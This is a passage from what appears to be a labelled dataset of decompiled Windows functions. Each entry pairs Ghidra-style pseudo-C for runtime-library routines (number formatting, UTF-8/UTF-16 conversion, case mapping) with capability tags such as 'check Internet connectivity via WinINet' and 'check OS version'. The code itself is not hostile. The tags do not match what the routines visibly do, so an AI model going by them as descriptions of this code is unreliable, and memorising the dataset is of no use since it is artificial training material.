>> 0x20;\n                                uVar21 = uVar12 >> 0x20;\n                                uVar14 = uVar13 + 1;\n                                uVar13 = uVar14;\n                            } while (uVar14 != uStack1464);\n                            goto code_r0x000140025aa0;\n                        }\n                        goto code_r0x000140025ae4;\n                    }\n                    goto code_r0x0001400259a6;\n                }\n                bVar23 = uStack1000 < uVar14;\n                puStack1992 = auStack996;\n                if (!bVar23) {\n                    puStack1992 = auStack1460;\n                }\n                uStack2024 = auStack996;\n                uStack2012 = uVar14;\n                if (bVar23) {\n                    uStack2012 = uStack1000;\n                }\n                uVar21 = uStack1000;\n                if (bVar23) {\n                    uVar21 = uVar14;\n                    uStack2024 = auStack1460;\n                }\n                uVar8 = 0;\n                uVar19 = 0;\n                uStack536 = 0;\n                if (uStack2012 != 0) {\n                    do {\n                        uVar14 = puStack1992[uVar19];\n                        iVar6 = uVar19;\n                        if (uVar14 == 0) {\n                            if (iVar6 == uVar8) {\n                                auStack532[uVar19] = 0;\n                                uVar8 = iVar6 + 1U;\n                                uStack536 = iVar6 + 1U;\n                            }\n                        }\n                        else {\n                            uVar13 = 0;\n                            if (uVar21 != 0) {\n                                do {\n                                    iVar17 = uVar19;\n                                    uVar12 = uVar19;\n                                    if (iVar17 == 0x73) break;\n                                    if (iVar17 == uVar8) {\n                                        auStack532[uVar19] = 0;\n                                        uStack536 = iVar17 + 1;\n                                    }\n                                    uVar12 = iVar17 + 1U;\n                                    uVar13 = uStack2024[iVar17 + -iVar6] * uVar14 + uVar13 + auStack532[uVar19];\n                                    auStack532[uVar19] = uVar13;\n                                    uVar8 = uStack536;\n                                    uVar13 = uVar13 >> 0x20;\n                                    uVar19 = uVar12;\n                                } while (iVar17 + 1U + -iVar6 != uVar21);\n                                uVar14 = uVar13;\n                                uVar19 = uVar12;\n                                while (uVar14 != 0) {\n                                    iVar17 = uVar19;\n                                    if (iVar17 == 0x73) goto code_r0x000140025aef;\n                                    if (iVar17 == uVar8) {\n                                        auStack532[uVar19] = 0;\n                                        uStack536 = iVar17 + 1;\n                                    }\n                                    uVar14 = auStack532[uVar19];\n                                    auStack532[uVar19] = uVar13 + uVar14;\n                                    uVar8 = uStack536;\n                                    uVar14 = uVar13 + uVar14 >> 0x20;\n                                    uVar13 = uVar14;\n                                    uVar19 = iVar17 + 1;\n                                }\n                            }\n                            if (uVar19 == 0x73) goto code_r0x000140025aef;\n                        }\n                        uVar19 = iVar6 + 1U;\n                    } while (iVar6 + 1U != uStack2012);\n                }\n                uStack1464 = uVar8;\n                if (uVar8 != 0) {\n                    if (uVar8 << 2 < 0x1cd) {\n                        fcn.140007990(auStack1460, auStack532, uVar8 << 2);\n                    }\n                    else {\n                        fcn.140008040(auStack1460, 0, 0x1cc);\n                        puVar9 = fcn.140012c78();\n                        *puVar9 = 0x22;\n                        fcn.14000c028();\n                    }\n                    uVar8 = uStack1464;\n                }\n            }\n            uVar14 = uVar8;\n            uStack2008 = uStack2008 - uStack2004;\n            uVar19 = uStack2008;\n        }\n        iVar6 = uStack2016 + uStack2000 * -10;\n        if (iVar6 != 0) {\n            uVar21 = *((iVar6 - 1) * 4 + 0x14002eda8);\n            if (uVar21 == 0) {\ncode_r0x000140025aef:\n                uStack1464 = 0;\ncode_r0x000140025af2:\n                uVar14 = uStack1464;\n            }\n            else if ((uVar21 != 1) && (uVar14 != 0)) {\n                uVar8 = 0;\n                uVar19 = 0;\n                do {\n                    uVar13 = auStack1460[uVar19] * uVar21 + uVar8;\n                    auStack1460[uVar19] = uVar13;\n                    uVar8 = uVar13 >> 0x20;\n                    uVar16 = uVar19 + 1;\n                    uVar19 = uVar16;\n                } while (uVar16 != uVar14);\n                uVar21 = uVar13 >> 0x20;\n                uVar14 = uStack1464;\n                if (uVar21 != 0) {\n                    if (0x72 < uStack1464) goto code_r0x000140025aef;\n                    auStack1460[uStack1464] = uVar21;\n                    uStack1464 = uStack1464 + 1;\n                    goto code_r0x000140025af2;\n                }\n            }\n        }\ncode_r0x000140025af9:\n        if (uVar22 != 0) {\n            uVar8 = 0;\n            uVar19 = 0;\n            do {\n                uVar13 = uVar8 + auStack1924[uVar19] * 10;\n                auStack1924[uVar19] = uVar13;\n                uVar21 = uVar19 + 1;\n                uVar19 = uVar21;\n                uVar8 = uVar13 >> 0x20;\n            } while (uVar21 != uVar22);\n            uVar22 = uVar13 >> 0x20;\n            if (uVar22 != 0) {\n                if (uStack1928 < 0x73) {\n                    auStack1924[uStack1928] = uVar22;\n                    uStack1928 = uStack1928 + 1;\n                }\n                else {\n                    uStack1000 = 0;\n                    uStack1928 = 0;\n                    fcn.1400131cc(auStack1924, 0x1cc, auStack996, 0);\n                }\n            }\n        }\n    }\n    iVar6 = fcn.140012d40(&uStack1928, &uStack1464);\n    if (iVar6 == 10) {\n        uVar22 = uStack2016 + 1;\n        *pcStack1952 = '1';\n        pcVar18 = pcStack1952 + 1;\n        if (uVar14 != 0) {\n            uVar8 = 0;\n            uVar19 = 0;\n            do {\n                uVar13 = uVar8 + auStack1460[uVar19] * 10;\n                auStack1460[uVar19] = uVar13;\n                uVar21 = uVar19 + 1;\n                uVar19 = uVar21;\n                uVar8 = uVar13 >> 0x20;\n            } while (uVar21 != uVar14);\n            uVar14 = uVar13 >> 0x20;\n            if (uVar14 != 0) {\n                if (uStack1464 < 0x73) {\n                    auStack1460[uStack1464] = uVar14;\n                    uStack1464 = uStack1464 + 1;\n                }\n                else {\n                    uStack1000 = 0;\n                    uStack1464 = 0;\n                    fcn.1400131cc(auStack1460, 0x1cc, auStack996, 0);\n                }\n            }\n        }\n    }\n    else if (iVar6 == 0) {\n        pcVar18 = pcStack1952;\n        uVar22 = uStack2016 - 1;\n    }\n    else {\n        pcVar18 = pcStack1952 + 1;\n        *pcStack1952 = iVar6 + '0';\n        uVar22 = uStack2016;\n    }\n    puStack1936[1] = uVar22;\n    uVar14 = uStack1984;\n    if (((-1 < uVar22) && (uStack1984 < 0x80000000)) && (iStack1956 == 0)) {\n        uVar14 = uStack1984 + uVar22;\n    }\n    uVar8 = uVar14;\n    if (in_stack_00000030 - 1U < uVar14) {\n        uVar8 = in_stack_00000030 - 1U;\n    }\n    pcStack1952 = pcStack1952 + uVar8;\n    while ((pcVar18 != pcStack1952 && (uStack1928 != 0))) {\n        uVar8 = 0;\n        uVar19 = 0;\n        do {\n            uVar13 = auStack1924[uVar19] * 1000000000 + uVar8;\n            auStack1924[uVar19] = uVar13;\n            uVar8 = uVar13 >> 0x20;\n            uVar22 = uVar19 + 1;\n            uVar19 = uVar22;\n        } while (uVar22 != uStack1928);\n        uVar22 = uVar13 >> 0x20;\n        if (uVar22 != 0) {\n            if (uStack1928 < 0x73) {\n                auStack1924[uStack1928] = uVar22;\n                uStack1928 = uStack1928 + 1;\n            }\n            else {\n                uStack1000 = 0;\n                uStack1928 = 0;\n                fcn.1400131cc(auStack1924, 0x1cc, auStack996, 0);\n            }\n        }\n        uVar8 = fcn.140012d40(&uStack1928, &uStack1464);\n        uVar22 = 8;\n        do {\n            uVar19 = (uVar8 & 0xffffffff) / 10;\n            if (uVar22 < pcStack1952 - pcVar18) {\n                pcVar18[uVar22] = uVar8 + uVar19 * -10 + '0';\n            }\n            uVar22 = uVar22 - 1;\n            uVar8 = uVar19;\n        } while (uVar22 != 0xffffffff);\n        iVar15 = pcStack1952 - pcVar18;\n        if (9 < iVar15) {\n            iVar15 = 9;\n        }\n        pcVar18 = pcVar18 + iVar15;\n    }\n    *pcVar18 = '\\0';\ncode_r0x00014002644d:\n    if (cStack1968 != '\\0') {\n        fcn.140028240(auStack1976);\n    }\n    fcn.140005b20(uStack72 ^ auStack2072);\n    return;\n}\n",
        "token_count": 9604
    },
    "14002658": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint64_t fcn.140026580(uint16_t *arg1, char **arg2, uint64_t arg3, ulong arg4)\n\n{\n    uint32_t uVar1;\n    uint16_t *puVar2;\n    char *pcVar3;\n    char *arg2_00;\n    int64_t iVar4;\n    int64_t iVar5;\n    uint32_t auStackX8 [2];\n    int64_t in_stack_00000028;\n    \n    arg2_00 = *arg2;\n    iVar4 = 0;\n    if (arg1 == NULL) {\n        while( true ) {\n            if (*arg2_00 == '\\0') {\n                iVar5 = 1;\n            }\n            else if (arg2_00[1] == '\\0') {\n                iVar5 = 2;\n            }\n            else {\n                iVar5 = (arg2_00[2] != '\\0') + 3;\n            }\n            iVar5 = fcn.140028968(0, arg2_00, iVar5, arg4);\n            if (iVar5 == -1) {\n                *(in_stack_00000028 + 0x30) = 1;\n                *(in_stack_00000028 + 0x2c) = 0x2a;\n                return -1;\n            }\n            if (iVar5 == 0) break;\n            if (iVar5 == 4) {\n                iVar4 = iVar4 + 1;\n            }\n            arg2_00 = arg2_00 + iVar5;\n            iVar4 = iVar4 + 1;\n        }\n    }\n    else {\n        puVar2 = arg1;\n        pcVar3 = arg2_00;\n        if (arg3 != 0) {\n            do {\n                if (*arg2_00 == '\\0') {\n                    iVar4 = 1;\n                }\n                else if (arg2_00[1] == '\\0') {\n                    iVar4 = 2;\n                }\n                else {\n                    iVar4 = (arg2_00[2] != '\\0') + 3;\n                }\n                iVar4 = fcn.140028968(auStackX8, arg2_00, iVar4, arg4);\n                if (iVar4 == -1) {\n                    *arg2 = arg2_00;\n                    *(in_stack_00000028 + 0x30) = 1;\n                    *(in_stack_00000028 + 0x2c) = 0x2a;\n                    return -1;\n                }\n                pcVar3 = NULL;\n                if (iVar4 == 0) {\n                    *puVar2 = 0;\n                    break;\n                }\n                uVar1 = auStackX8[0];\n                if (0xffff < auStackX8[0]) {\n                    pcVar3 = arg2_00;\n                    if (arg3 < 2) break;\n                    auStackX8[0] = auStackX8[0] - 0x10000;\n                    arg3 = arg3 - 1;\n                    *puVar2 = auStackX8[0] >> 10 | 0xd800;\n                    puVar2 = puVar2 + 1;\n                    uVar1 = auStackX8[0] & 0x3ff | 0xdc00;\n                }\n                *puVar2 = uVar1;\n                pcVar3 = arg2_00 + iVar4;\n                puVar2 = puVar2 + 1;\n                arg3 = arg3 - 1;\n                arg2_00 = pcVar3;\n            } while (arg3 != 0);\n        }\n        *arg2 = pcVar3;\n        iVar4 = puVar2 - arg1 >> 1;\n    }\n    return iVar4;\n}\n",
        "token_count": 815
    },
    "1400267c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.1400267c0(uchar *arg1, uint16_t **arg2, uint64_t arg3, ulong arg4)\n\n{\n    uint64_t arg3_00;\n    int64_t iVar1;\n    uint16_t *puVar2;\n    uint16_t *puVar3;\n    uchar *arg1_00;\n    ulong in_stack_00000028;\n    uchar auStack120 [32];\n    ulong uStack88;\n    ulong uStack80;\n    uchar auStack72 [8];\n    uint64_t uStack64;\n    \n    uStack64 = *0x14003e020 ^ auStack120;\n    puVar2 = *arg2;\n    uStack88 = in_stack_00000028;\n    puVar3 = puVar2;\n    uStack80 = arg4;\n    if (arg1 == NULL) {\n        iVar1 = fcn.140028c74(auStack72, *puVar2, arg4, in_stack_00000028);\n        while ((iVar1 != -1 && ((iVar1 == 0 || (auStack72[iVar1 + -1] != '\\0'))))) {\n            puVar2 = puVar2 + 1;\n            iVar1 = fcn.140028c74(auStack72, *puVar2, arg4, uStack88);\n        }\n    }\n    else {\n        while( true ) {\n            arg1_00 = auStack72;\n            if (3 < arg3) {\n                arg1_00 = arg1;\n            }\n            arg3_00 = fcn.140028c74(arg1_00, *puVar2, uStack80, uStack88);\n            if (arg3_00 == 0xffffffffffffffff) {\n                *arg2 = puVar3;\n                goto code_r0x0001400268ec;\n            }\n            if (arg1_00 != arg1) {\n                if (arg3 < arg3_00) goto code_r0x000140026884;\n                fcn.140007990(arg1, arg1_00, arg3_00);\n            }\n            if ((arg3_00 != 0) && (arg1[arg3_00 - 1] == '\\0')) break;\n            puVar2 = puVar2 + 1;\n            if (arg3_00 != 0) {\n                puVar3 = puVar2;\n            }\n            arg3 = arg3 - arg3_00;\n            arg1 = arg1 + arg3_00;\n        }\n        puVar3 = NULL;\ncode_r0x000140026884:\n        *arg2 = puVar3;\n    }\ncode_r0x0001400268ec:\n    fcn.140005b20(uStack64 ^ auStack120);\n    return;\n}\n",
        "token_count": 602
    },
    "14002711": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint16_t fcn.14002711c(ulong noname_0, ulong arg2)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    int64_t arg1;\n    uint16_t auStackX8 [8];\n    uint16_t uStackX24;\n    int64_t iStack40;\n    int64_t iStack32;\n    char cStack16;\n    \n    if (noname_0 == 0xffff) {\n        return 0xffff;\n    }\n    auStackX8[0] = noname_0;\n    fcn.140012c98(&iStack40, arg2);\n    uVar2 = auStackX8[0];\n    if (*(iStack32 + 0xc) == 0xfde9) {\n        if (0x7f < auStackX8[0]) {\n            arg1 = *(iStack32 + 0x138);\ncode_r0x0001400271c3:\n            iVar1 = fcn.140028d18(arg1, 0x100, auStackX8, 1);\n            if (iVar1 != 0) {\n                auStackX8[0] = uStackX24;\n            }\n            goto code_r0x0001400271f6;\n        }\n        if ((*(\n              L\"         (((((                  H\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x10\\x10\\x10\\x10\\x10\\x10\\x10\u0181\u0181\u0181\u0181\u0181\u0181\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\\x10\\x10\\x10\\x10\\x10\\x10\u0182\u0182\u0182\u0182\u0182\u0182\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\\x10\\x10\\x10\\x10      (                          \\b\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\u0112\\x10\\x100\\x10\\x10\\x10\\x10\\x14\\x14\\x10\u0112\\x10\\x10\\x10\\x14\u0112\\x10\\x10\\x10\\x10\\x10\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\\x10\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\\x10\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0101\"\n              + uVar2) & 1) == 0) {\n            auStackX8[0] = auStackX8[0] & 0xff;\n            goto code_r0x0001400271f6;\n        }\n    }\n    else {\n        if (0xff < auStackX8[0]) {\n            arg1 = *(iStack32 + 0x138);\n            if (arg1 == 0) goto code_r0x0001400271f6;\n            goto code_r0x0001400271c3;\n        }\n        if ((*(\n              L\"         (((((                  H\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x84\\x10\\x10\\x10\\x10\\x10\\x10\\x10\u0181\u0181\u0181\u0181\u0181\u0181\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\\x10\\x10\\x10\\x10\\x10\\x10\u0182\u0182\u0182\u0182\u0182\u0182\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\\x10\\x10\\x10\\x10      (                          \\b\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\u0112\\x10\\x100\\x10\\x10\\x10\\x10\\x14\\x14\\x10\u0112\\x10\\x10\\x10\\x14\u0112\\x10\\x10\\x10\\x10\\x10\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0101\\x10\u0101\u0101\u0101\u0101\u0101\u0101\u0101\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\\x10\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0102\u0101\"\n              + uVar2) & 1) == 0) {\n            auStackX8[0] = auStackX8[0] & 0xff;\n            goto code_r0x0001400271f6;\n        }\n    }\n    auStackX8[0] = *(*(iStack32 + 0x110) + uVar2);\ncode_r0x0001400271f6:\n    if (cStack16 != '\\0') {\n        *(iStack40 + 0x3a8) = *(iStack40 + 0x3a8) & 0xfffffffd;\n    }\n    return auStackX8[0];\n}\n",
        "token_count": 1233
    },
    "140027a9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint8_t * fcn.140027a98(uint8_t *arg1, uint8_t *arg2)\n\n{\n    uint *puVar1;\n    uint8_t *puVar2;\n    int64_t aiStack40 [2];\n    int64_t iStack24;\n    char cStack16;\n    \n    if ((arg1 == NULL) || (arg2 == NULL)) {\n        puVar1 = fcn.140012c78();\n        *puVar1 = 0x16;\n        fcn.14000c028();\n    }\n    else if (arg1 < arg2) {\n        fcn.140012c98(aiStack40, 0);\n        puVar2 = arg2 + -1;\n        if (*(iStack24 + 8) != 0) {\n            do {\n                puVar2 = puVar2 + -1;\n                if (puVar2 < arg1) break;\n            } while ((*(*puVar2 + 0x19 + iStack24) & 4) != 0);\n            puVar2 = arg2 + (-1 - (arg2 - puVar2 & 1));\n        }\n        if (cStack16 == '\\0') {\n            return puVar2;\n        }\n        *(aiStack40[0] + 0x3a8) = *(aiStack40[0] + 0x3a8) & 0xfffffffd;\n        return puVar2;\n    }\n    return NULL;\n}\n",
        "token_count": 318
    },
    "140028c7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0001400264f0)\n// WARNING: Removing unreachable block (ram,0x0001400264f8)\n// WARNING: Removing unreachable block (ram,0x000140026500)\n\nint64_t fcn.140028c74(uint8_t *arg1, ulong noname_1, ulong *arg3, int64_t arg4)\n\n{\n    uint8_t uVar1;\n    int64_t iVar2;\n    ulong arg1_00;\n    int64_t iVar3;\n    uint64_t uVar4;\n    ulong *arg2;\n    uint8_t uVar5;\n    ulong auStackX24 [2];\n    \n    uVar4 = noname_1;\n    arg2 = 0x140040938;\n    if (arg3 != NULL) {\n        arg2 = arg3;\n    }\n    if (*arg2 == 0) {\n        if (0x3ff < noname_1 + 0x2400) {\n            if (noname_1 + 0x2800 < 0x400) {\n                *arg2 = (noname_1 & 0x3f27ff) * 0x400 + 0x10000;\n                return 0;\n            }\n            if (arg1 != NULL) {\n                if (noname_1 != 0) {\n                    if ((noname_1 & 0xff80) == 0) {\n                        *arg1 = noname_1;\n                        return 1;\n                    }\n                    if ((noname_1 & 0xf800) == 0) {\n                        iVar3 = 1;\n                        uVar5 = 0xc0;\n                        iVar2 = iVar3;\n                    }\n                    else {\n                        if (noname_1 - 0xd800 < 0x800) {\n                            *arg2 = 0;\n                            *(arg4 + 0x30) = 1;\n                            *(arg4 + 0x2c) = 0x2a;\n                            return -1;\n                        }\n                        iVar3 = 2;\n                        uVar5 = 0xe0;\n                        iVar2 = iVar3;\n                    }\n                    do {\n                        uVar1 = uVar4;\n                        uVar4 = uVar4 >> 6;\n                        arg1[iVar3] = uVar1 & 0x3f | 0x80;\n                        iVar3 = iVar3 + -1;\n                    } while (iVar3 != 0);\n                    *arg1 = uVar4 | uVar5;\n                    *arg2 = 0;\n                    return iVar2 + 1;\n                }\n                *arg1 = 0;\n            }\n            *arg2 = 0;\n            return 1;\n        }\n    }\n    else if (noname_1 + 0x2400 < 0x400) {\n        auStackX24[0] = 0;\n        arg1_00 = fcn.140026498(arg1, (noname_1 & 0xffff23ff) + *arg2, auStackX24, arg4);\n        iVar2 = fcn.14002894c(arg1_00, arg2);\n        return iVar2;\n    }\n    iVar2 = fcn.140028954(arg2, arg4);\n    return iVar2;\n}\n",
        "token_count": 716
    },
    "140028ee": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.140028eec(int64_t *arg1, ulong arg2, ulong arg3, uint8_t *arg4, ulong noname_4, uint8_t *noname_5, \n                  ulong noname_6, ulong noname_7, ulong noname_8, ulong noname_9, ulong noname_10, ulong noname_11, \n                  ulong noname_12, ulong noname_13, ulong noname_14, ulong noname_15, ulong noname_16, ulong noname_17, \n                  ulong noname_18, ulong noname_19, ulong arg_b0h, ulong arg_b8h, ulong arg_c0h, ulong arg_c8h)\n\n{\n    int32_t *lpMem;\n    uint8_t uVar1;\n    ulong arg1_00;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint8_t *puVar5;\n    int64_t iVar6;\n    uint *arg3_00;\n    uint *puVar7;\n    uint64_t uVar8;\n    uchar *puVar9;\n    uchar *puVar10;\n    uchar *puVar11;\n    ulong var_8h;\n    ulong var_10h;\n    ulong lpCPInfo;\n    ulong var_30h;\n    ulong var_48h;\n    uchar auStack216 [32];\n    ulong uStack184;\n    uint uStack176;\n    uint32_t auStack136 [2];\n    uint8_t *puStack128;\n    ulong uStack120;\n    uint32_t uStack112;\n    uint8_t auStack106 [18];\n    uint64_t uStack88;\n    \n    puVar9 = &stack0xffffffffffffff28;\n    puVar11 = &stack0xffffffffffffff28;\n    puVar10 = &stack0xffffffffffffff28;\n    uStack88 = *0x14003e020 ^ &stack0xffffffffffffff78;\n    auStack136[0] = arg3;\n    uStack120 = arg2;\n    puStack128 = noname_5;\n    if (noname_4 < 1) {\n        if (noname_4 < -1) goto code_r0x000140029134;\n    }\n    else {\n        noname_4._0_4_ = fcn.1400157c8(arg4, noname_4);\n    }\n    if (noname_6 < 1) {\n        puVar10 = &stack0xffffffffffffff28;\n        if (noname_6 < -1) goto code_r0x000140029134;\n    }\n    else {\n        noname_6._0_4_ = fcn.1400157c8(noname_5, noname_6);\n    }\n    if (noname_7 == 0) {\n        noname_7._0_4_ = *(*arg1 + 0xc);\n    }\n    if ((noname_4 == 0) || (noname_6 == 0)) {\n        puVar10 = &stack0xffffffffffffff28;\n        if ((noname_4 == noname_6) ||\n           (((puVar10 = &stack0xffffffffffffff28,  1 < noname_6 || (puVar10 = &stack0xffffffffffffff28,  1 < noname_4))\n            || (iVar2 = (*_sym.imp.KERNEL32.dll_GetCPInfo)(noname_7, &stack0xffffffffffffff90), \n               puVar10 = &stack0xffffffffffffff28,  iVar2 == 0)))) goto code_r0x000140029134;\n        if (0 < noname_4) {\n            puVar10 = &stack0xffffffffffffff28;\n            if (1 < uStack112) {\n                puVar5 = &stack0xffffffffffffff96;\n                while (((puVar10 = &stack0xffffffffffffff28,  auStack106[0] != 0 &&\n                        (puVar10 = &stack0xffffffffffffff28,  puVar5[1] != 0)) &&\n                       ((uVar1 = *arg4,  uVar1 < *puVar5 ||\n                        (puVar10 = &stack0xffffffffffffff28,  puVar5[1] <= uVar1 && uVar1 != puVar5[1]))))) {\n                    puVar5 = puVar5 + 2;\n                    auStack106[0] = *puVar5;\n                }\n            }\n            goto code_r0x000140029134;\n        }\n        if (0 < noname_6) {\n            puVar10 = &stack0xffffffffffffff28;\n            if (1 < uStack112) {\n                puVar5 = &stack0xffffffffffffff96;\n                while (((puVar10 = &stack0xffffffffffffff28,  auStack106[0] != 0 &&\n                        (puVar10 = &stack0xffffffffffffff28,  puVar5[1] != 0)) &&\n                       ((uVar1 = *noname_5,  uVar1 < *puVar5 ||\n                        (puVar10 = &stack0xffffffffffffff28,  puVar5[1] <= uVar1 && uVar1 != puVar5[1]))))) {\n                    puVar5 = puVar5 + 2;\n                    auStack106[0] = *puVar5;\n                }\n            }\n            goto code_r0x000140029134;\n        }\n    }\n    uStack176 = 0;\n    uStack184 = 0;\n    uVar3 = fcn.140020210(noname_7, 9);\n    puVar10 = &stack0xffffffffffffff28;\n    if ((uVar3 == 0) ||\n       (uVar8 = uVar3 * 2 + 0x10,  uVar8 = -(uVar3 * 2 < uVar8) & uVar8,  puVar10 = &stack0xffffffffffffff28, \n       uVar8 == 0)) goto code_r0x000140029134;\n    if (uVar8 < 0x401) {\n        iVar6 = fcn.140006180();\n        iVar6 = -iVar6;\n        puVar9 = &stack0xffffffffffffff28 + iVar6;\n        arg3_00 = &stack0xffffffffffffff78 + iVar6;\n        puVar10 = &stack0xffffffffffffff28 + iVar6;\n        if (arg3_00 == NULL) goto code_r0x000140029134;\n        *arg3_00 = 0xcccc;\ncode_r0x0001400290d2:\n        arg3_00 = arg3_00 + 4;\n        puVar11 = puVar9;\n    }\n    else {\n        arg3_00 = fcn.14001a93c(uVar8);\n        if (arg3_00 != NULL) {\n            *arg3_00 = 0xdddd;\n            goto code_r0x0001400290d2;\n        }\n    }\n    puVar10 = puVar11;\n    if (arg3_00 == NULL) goto code_r0x000140029134;\n    *(puVar11 + 0x28) = uVar3;\n    *(puVar11 + 0x20) = arg3_00;\n    *(puVar11 + -8) = 0x1400290f8;\n    iVar2 = fcn.140020210(noname_7, 1);\n    if (iVar2 == 0) {\ncode_r0x000140029121:\n        iVar2 = arg3_00[-4];\n    }\n    else {\n        *(puVar11 + 0x28) = 0;\n        *(puVar11 + 0x20) = 0;\n        *(puVar11 + -8) = 0x14002911a;\n        iVar2 = fcn.140020210(noname_7, 9);\n        if ((iVar2 == 0) || (uVar8 = iVar2 * 2 + 0x10,  uVar8 = -(iVar2 * 2 < uVar8) & uVar8,  uVar8 == 0))\n        goto code_r0x000140029121;\n        if (uVar8 < 0x401) {\n            *(puVar11 + -8) = 0x14002918b;\n            iVar6 = fcn.140006180();\n            iVar6 = -iVar6;\n            puVar10 = puVar11 + iVar6;\n            puVar7 = puVar11 + iVar6 + 0x50;\n            if (puVar7 == NULL) goto code_r0x000140029121;\n            *puVar7 = 0xcccc;\n            puVar11 = puVar11 + iVar6;\ncode_r0x0001400291b3:\n            puVar7 = puVar7 + 4;\n            puVar10 = puVar11;\n        }\n        else {\n            *(puVar11 + -8) = 0x1400291a5;\n            puVar7 = fcn.14001a93c(uVar8);\n            if (puVar7 != NULL) {\n                *puVar7 = 0xdddd;\n                goto code_r0x0001400291b3;\n            }\n        }\n        if (puVar7 == NULL) goto code_r0x000140029121;\n        lpMem = puVar7 + -4;\n        *(puVar10 + 0x28) = iVar2;\n        *(puVar10 + 0x20) = puVar7;\n        *(puVar10 + -8) = 0x1400291e2;\n        iVar4 = fcn.140020210(noname_7, 1);\n        if (iVar4 != 0) {\n            uVar8 = auStack136[0];\n            *(puVar10 + 0x40) = 0;\n            *(puVar10 + 0x38) = 0;\n            *(puVar10 + 0x30) = 0;\n            arg1_00 = uStack120;\n            *(puVar10 + 0x28) = iVar2;\n            *(puVar10 + 0x20) = puVar7;\n            *(puVar10 + -8) = 0x140029230;\n            fcn.140019e94(arg1_00, uVar8, arg3_00, uVar3);\n            if (*lpMem == 0xdddd) {\n                *(puVar10 + -8) = 0x140029244;\n                fcn.140019b4c(lpMem);\n            }\n            if (arg3_00[-4] == 0xdddd) {\n                *(puVar10 + -8) = 0x140029251;\n                fcn.140019b4c(arg3_00 + -4);\n            }\n            goto code_r0x000140029134;\n        }\n        if (*lpMem == 0xdddd) {\n            *(puVar10 + -8) = 0x1400291fa;\n            fcn.140019b4c(lpMem);\n        }\n        iVar2 = arg3_00[-4];\n    }\n    if (iVar2 == 0xdddd) {\n        *(puVar10 + -8) = 0x140029132;\n        fcn.140019b4c(arg3_00 + -4);\n    }\ncode_r0x000140029134:\n    uVar8 = uStack88 ^ &stack0xffffffffffffff78;\n    *(puVar10 + -8) = 0x140029140;\n    fcn.140005b20(uVar8);\n    return;\n}\n",
        "token_count": 2534
    },
    "14002936": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
